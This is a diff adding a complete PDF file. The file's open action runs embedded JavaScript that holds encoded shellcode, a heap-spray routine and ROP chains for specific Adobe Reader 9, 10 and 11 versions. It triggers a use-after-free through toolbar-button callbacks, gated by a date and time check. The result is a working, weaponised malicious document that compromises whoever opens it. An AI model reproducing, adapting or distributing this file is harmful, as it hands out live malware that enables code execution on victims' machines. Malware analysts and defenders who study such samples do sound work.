@@ -1,0 +1,170 @@
+%PDF-1.2
+1 0 obj
+<<
+	/Pages 2 0 R
+	/AcroForm 5 0 R
+	/OpenAction <<
+		/JS (\n          var date_flag = 0, time_flag = 0;\n          var cur_date = util.printd\("d.m.yy", new Date\(\)\);\n          var cur_hr = util.printd\("H", new Date\(\)\);\n          if \("everyday".toLowerCase\(\).replace\(/ /g,''\) == "everyday"\) {\n            date_flag = 1;\n          }\n          else {\n            var arr = "everyday".split\(","\); \n            for \(var i in arr\) {\n              if \(arr[i].replace\(/ /g,''\) == cur_date\) {\n                date_flag = 1;\n                break;\n              }\n            }\n          }\n          if \("0,1,2,3,4,5,6,7,10,11,12,13,14,15,16,17,18,19,20,21,22,23".toLowerCase\(\).replace\(/ /g,''\) == "anytime"\) {\n            time_flag = 1;\n          }\n          else {\n            var arr = "0,1,2,3,4,5,6,7,10,11,12,13,14,15,16,17,18,19,20,21,22,23".split\(","\);\n            for \(var i in arr\) {\n              arr[i] = arr[i].replace\(/ /g,''\);\n              if \(arr[i].indexOf\(">="\) >= 0\) {\n                time_flag = 1;\n                // if any condition doesn't hold, don't proceed.\n                if \(!\(cur_hr >= parseInt\(arr[i].split\(">="\)[1]\)\)\) {\n                  time_flag = 0;\n                  break;\n                }\n              }\n              else if \(arr[i].indexOf\(">"\) >= 0\) {\n                time_flag = 1;\n                // if any condition doesn't hold, don't proceed.\n                if \(!\(cur_hr > parseInt\(arr[i].split\(">"\)[1]\)\)\) {\n                  time_flag = 0;\n                  break;\n                }\n              }\n              if \(arr[i].indexOf\("<="\) >= 0\) {\n                time_flag = 1;\n                // if any condition doesn't hold, don't proceed.\n                if \(!\(cur_hr <= parseInt\(arr[i].split\("<="\)[1]\)\)\) {\n                  time_flag = 0;\n                  break;\n                }\n              }\n              else if \(arr[i].indexOf\("<"\) >= 0\) {\n                time_flag = 1;\n                // if any condition doesn't hold, don't proceed.\n                if \(!\(cur_hr < parseInt\(arr[i].split\("<"\)[1]\)\)\) {\n                  time_flag = 0;\n                  break;\n                }\n              }\n              if \(cur_hr == parseInt\(arr[i]\)\) {\n                time_flag = 1;\n                break;\n              }\n            }\n          }\n          if \(date_flag && time_flag\) {\n          \nvar shellcode = unescape\("%uc0db%u74d9%uf424%u7db8%ua7dd%u5b9d%uc931%u5db1%uc383%u3104%u1443%u4303%u3f69%u6152%u3d79%u9a9d%u2279%u7f17%u6248%u0b43%u52fa%u5907%u19f6%u4a45%u6c8d%u7d42%uda26%ub0b4%u77b7%ud384%u8a3b%u33d9%u4502%u352c%ub843%u67dd%ub61c%u9870%u8229%u1348%u0261%uc0c9%u2531%u56f8%u7c4a%u59da%uf49f%u4253%u31fc%uf92d%ucd36%u2bac%u2e07%u1202%udda8%u525a%u3e0e%uaa29%uc36d%u692a%u1f0c%u6abe%ud4b6%u5718%u3847%u1cfe%uf54b%u7a74%u084f%uf058%u816b%ud75f%ud1fa%uf37b%u82a7%ua2e2%u640d%ub41a%ud9ee%ubebe%u0d02%u9cb3%ue24a%u1efe%u6c8a%u6d88%u33b8%ufa22%ubcf0%ufdec%u96f7%u9149%u1906%ubbaa%u4dcc%ud3fa%uede5%u2391%u380a%u7435%u93a4%u24f6%u4404%u2e9f%ubb8b%u50bf%ud446%ub6a8%udb68%uad28%ub70d%u4e41%u28a4%ue3e7%ud240%u6560%u75c2%u111c%ua87b%ub892%uc009%u3b2b%u8185%u0fe4%u2dd5%ue421%ucd95%ufea0%u8645%u0136%u0665%ue7be%ub60f%ub096%u2fa7%u4bb3%uaf56%u3669%u3b58%uc698%ucc16%ud4e9%uad4e%u2511%u448e%u4f12%uce8a%ue745%u3790%ua8a1%u126b%uafb1%ue393%uc480%u71a5%ub2ad%u95c9%u432d%uff9f%u2b2d%ua447%u4e7d%u7188%uc312%u7a1c%ub743%u12b7%uee69%ubcff%uc592%uba7c%u9b6d%u63a0%u6306%u93e4%u09d6%uc3e4%uc6be%ueccb%u260e%ua4c6%uad06%u0786%ub2b6%uc683%ub266%ud327%u177f%ue4c8%ua97f%u32f5%udf46%u873e%ud0fd%uaa75%u7b54%uf875%uaea7"\);\n\nfunction heapSpray\(str, str_addr, r_addr\) {\n  var aaa = unescape\("%u0c0c"\);\n  aaa += aaa;\n  while \(\(aaa.length + 24 + 4\) < \(0x8000 + 0x8000\)\) aaa += aaa;\n  var i1 = r_addr - 0x24;\n  var bbb = aaa.substring\(0, i1 / 2\);\n  var sa = str_addr;\n  while \(sa.length < \(0x0c0c - r_addr\)\) sa += sa;\n  bbb += sa;\n  bbb += aaa;\n  var i11 = 0x0c0c - 0x24;\n  bbb = bbb.substring\(0, i11 / 2\);\n  bbb += str;\n  bbb += aaa;\n  var i2 = 0x4000 + 0xc000;\n  var ccc = bbb.substring\(0, i2 / 2\);\n  while \(ccc.length < \(0x40000 + 0x40000\)\) ccc += ccc;\n  var i3 = \(0x1020 - 0x08\) / 2;\n  var ddd = ccc.substring\(0, 0x80000 - i3\);\n  var eee = new Array\(\);\n  for \(i = 0; i < 0x1e0 + 0x10; i++\) eee[i] = ddd + "s";\n  return;\n}\n\nvar executable = "";\nvar rop9 = unescape\("%u313d%u4a82%ua713%u4a82%u1f90%u4a80%u9038%u4a84%u7e7d%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u155a%u4a80%u3a84%u4a84%ud4de%u4a82%u1f90%u4a80%u76aa%u4a84%u9030%u4a84%u4122%u4a84%u76aa%u4a84%u7e7d%u4a80%u3178%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u3a82%u4a84%u6c5e%u4a84%u76ab%u4a84%u595f%u96ac%u0400%u0000%u2f5e%ubade%u7984%u4a81%u3178%u4a81"\);\nvar rop10 = unescape\("%u6015%u4a82%ue090%u4a82%u007d%u4a82%u0038%u4a85%u46d5%u4a82%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u5016%u4a80%u420c%u4a84%u4241%u4a81%u007d%u4a82%u6015%u4a82%u0030%u4a85%ub49d%u4a84%u6015%u4a82%u46d5%u4a82%u4197%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u4013%u4a81%ue036%u4a84%ua8df%u4a82%uc61b%ua8f3%u0400%u0000%u49bc%u5882%u8b31%u4a81%u4197%u4a81"\);\nvar rop11 = unescape\("%u822c%u4a85%uf129%u4a82%u597f%u4a85%u6038%u4a86%uf1d5%u4a83%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u5093%u4a85%u66df%ub14e%u0030%u4a85%u597f%u4a85%u0031%u4a85%u90f1%uc52d%u822c%u4a85%uf1d5%u4a83%ud4f8%u4a85%u6030%u4a86%u4864%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u4856%u4a81%u05a0%u4a85%u0bc4%u4a86%u05a0%u4a85%uc376%u4a81%u63d0%u4a84%u0400%u0000%ud4f8%u4a85%ud4f8%u4a85%u4864%u4a81"\);\nvar r11 = false;\nvar vulnerable = true;\n\nvar obj_size;\nvar rop;\nvar ret_addr;\nvar rop_addr;\nvar r_addr;\n\nif \(app.viewerVersion >= 9 && app.viewerVersion < 10 && app.viewerVersion <= 9.504\) {\n  obj_size = 0x330 + 0x1c;\n  rop = rop9;\n  ret_addr = unescape\("%ua83e%u4a82"\);\n  rop_addr = unescape\("%u08e8%u0c0c"\);\n  r_addr = 0x08e8;\n} else if \(app.viewerVersion >= 10 && app.viewerVersion < 11 && app.viewerVersion <= 10.106\) {\n  obj_size = 0x360 + 0x1c;\n  rop = rop10;\n  rop_addr = unescape\("%u08e4%u0c0c"\);\n  r_addr = 0x08e4;\n  ret_addr = unescape\("%ua8df%u4a82"\);\n} else if \(app.viewerVersion >= 11 && app.viewerVersion <= 11.002\) {\n  r11 = true;\n  obj_size = 0x370;\n  rop = rop11;\n  rop_addr = unescape\("%u08a8%u0c0c"\);\n  r_addr = 0x08a8;\n  ret_addr = unescape\("%u8003%u4a84"\);\n} else {\n  vulnerable = false;\n}\n\nif \(vulnerable\) {\n  var payload = rop + shellcode;\n  heapSpray\(payload, ret_addr, r_addr\);\n\n  var part1 = "";\n  if \(!r11\) {\n    for \(i = 0; i < 0x1c / 2; i++\) part1 += unescape\("%u4141"\);\n  }\n  part1 += rop_addr;\n  var part2 = "";\n  var part2_len = obj_size - part1.length * 2;\n  for \(i = 0; i < part2_len / 2 - 1; i++\) part2 += unescape\("%u4141"\);\n  var arr = new Array\(\);\n\n  removeButtonFunc = function \(\) {\n    app.removeToolButton\({\n        cName: "evil"\n    }\);\n\n    for \(i = 0; i < 10; i++\) arr[i] = part1.concat\(part2\);\n  }\n\n  addButtonFunc = function \(\) {\n    app.addToolButton\({\n      cName: "xxx",\n      cExec: "1",\n      cEnable: "removeButtonFunc\(\);"\n    }\);\n  }\n\n  app.addToolButton\({\n    cName: "evil",\n    cExec: "1",\n    cEnable: "addButtonFunc\(\);"\n  }\);\n\n}\n})
+		/S /JavaScript
+	>>
+	/Type /Catalog
+>>
+endobj
+2 0 obj
+<<
+	/Count 1
+	/Kids [ 3 0 R ]
+	/Type /Pages
+>>
+endobj
+3 0 obj
+<<
+	/Parent 2 0 R
+	/Contents 4 0 R
+	/Resources <<
+		/Font <<
+			/F1 <<
+				/Type /Font
+				/Subtype /Type1
+				/BaseFont /Helvetica
+			>>
+		>>
+	>>
+	/Type /Page
+	/MediaBox [ 0 0 595 842 ]
+>>
+endobj
+4 0 obj
+<<
+	/Filter /FlateDecode
+	/Length 167
+>>stream
+xÚMÍÁ
+‚@àû>Åß!Ò‹í†ÁêPĞa_`ÉÑ5ÌİñíÓ4ğ2Ìğó“I¶=	Y²a¦qY°x¸¯L€G	‡ıb±Î–È×måPZóÂMY·
+!Ÿ,—,›ÁøtÁ8†Ş…,¡7tTW»t†œƒ×ª…i‘+ëu´Æ>ŸûÓó_Ü-yßã¡I½Ñ©Ş 1&Úƒô1Äfd¾Ö™;_
+endstream
+endobj
+5 0 obj
+<<
+	/Fields [ 7 0 R ]
+	/XFA 6 0 R
+>>
+endobj
+6 0 obj
+<<
+	/Filter /FlateDecode
+	/Length 490
+>>stream
+xÚ¥SÁnÛ0ıæíP³Án™¬b¶vjï…,Ñ¶P[ò$:qöõ£ì8Íz*°ƒ R|$Ÿ(y?½8`L.øªØ•wÅ½’³÷|Ç|ÊVUtDãÀ§RÛPciÂ €BI|ãÚÜèøx<–ì—!¶L‡ƒ†Ù8øRŞå´1bBOlØFIç	£6ä¨v®]	.	°vT’p{MøÎŞ¾İ26iª›ÑëS˜¨*¨.„×VE¾ŞešºÅG$PÜ],¤ªÂyGN÷în9âù9¢¶§\ÜD7’`¶Ä÷O§‘!z{g4±Ü0ßæ&F÷†Á°¢ÙXª\¨)Ù8ìí¹ÃÃD|æ59%ëÅk»eNü–„¶`¾!F¹—’İO˜%›I=¢·7[Â92ê¨E÷ñ"ÌPˆÃÙœµ=.U/kç­4™®*|ğKô­F†‡}y#Ïz÷¿òÀ"Ë¿ê<ñ@?²¿	”'ünÃë-F&h[‰bxa|Ïbm xÍYÜúÀå=®¬møË4zo5é„”Ş¿9vë*nx¤¼zJ¾N£>t!Q9`J¼aşôñ÷èëÏˆHÎ·I41â—éf|–p•ÎC¬%áµ	\3ÎîúçÕ_2Bq†
+endstream
+endobj
+7 0 obj
+<<
+	/T (form1[0])
+	/Kids [ <</T (#subform[0])/Parent 7 0 R/Kids [ 8 0 R 10 0 R ]/DA (/F1 10 Tf 0 g)>> ]
+	/DA (/F1 10 Tf 0 g)
+>>
+endobj
+8 0 obj
+<<
+	/T (TextField1[0])
+	/Rect [ 50 280 550 680 ]
+	/F 4
+	/DA (/F1 12 Tf 0 g)
+	/AP <<
+		/N 9 0 R
+	>>
+	/Ff 4096
+	/Parent <<
+		/T (#subform[0])
+		/Parent 7 0 R
+		/Kids [ 8 0 R 10 0 R ]
+		/DA (/F1 10 Tf 0 g)
+	>>
+	/Subtype /Widget
+	/FT /Tx
+>>
+endobj
+9 0 obj
+<<
+	/Filter /FlateDecode
+	/BBox [ 0 0 500 400 ]
+	/Matrix [ 1 0 0 1 0 0 ]
+	/Resources <<
+		/Font <<
+			/F1 <<
+				/Type /Font
+				/Subtype /Type1
+				/BaseFont /Helvetica
+			>>
+		>>
+	>>
+	/Length 97
+	/Subtype /Form
+>>stream
+xÚ3P0P050P0â¢T®`.=SKLFQ:—¡‚¡B.4¶´TÈá2’0–edÁi# ™T›W—fÅÁ$DH¯Ši W€ìU€é; `m!¼
+endstream
+endobj
+10 0 obj
+<<
+	/T (Button1[0])
+	/H /I
+	/Rect [ 490 240 550 270 ]
+	/F 4
+	/AP <<
+		/N 11 0 R
+	>>
+	/Parent <<
+		/T (#subform[0])
+		/Parent 7 0 R
+		/Kids [ 8 0 R 10 0 R ]
+		/DA (/F1 10 Tf 0 g)
+	>>
+	/Ff 65536
+	/Subtype /Widget
+	/FT /Btn
+	/DA (/F1 10 Tf 0 g)
+>>
+endobj
+11 0 obj
+<<
+	/Filter /FlateDecode
+	/BBox [ 0 0 60 30 ]
+	/Matrix [ 1 0 0 1 0 0 ]
+	/Resources <<
+		/Font <<
+			/F1 <<
+				/Type /Font
+				/Subtype /Type1
+				/BaseFont /Helvetica
+			>>
+		>>
+	>>
+	/Length 144
+	/Subtype /Form
+>>stream
+xÚe±Â0DwÅ±ÁRì”TÉŠ[ó	m#!ÊĞÿ¸$Ubğ-ùN»¨ƒî– }tØ²(ƒ¢Wl³,bÈÃJu/ññë.ĞİÏ¨‹hç•°şÂ[x-n|·ª-Zx;l%•,Z†eF¹&9ßR$69_IõÁîYãü'¤§Ü’| s–/
+endstream
+endobj
+xref
+0 12
+0000000000 65535 f
+0000000010 00000 n
+0000007585 00000 n
+0000007654 00000 n
+0000007876 00000 n
+0000008124 00000 n
+0000008182 00000 n
+0000008753 00000 n
+0000008903 00000 n
+0000009175 00000 n
+0000009540 00000 n
+0000009822 00000 n
+trailer
+<<
+	/Root 1 0 R
+	/Size 12
+>>
+startxref
+10234
+%%EOF
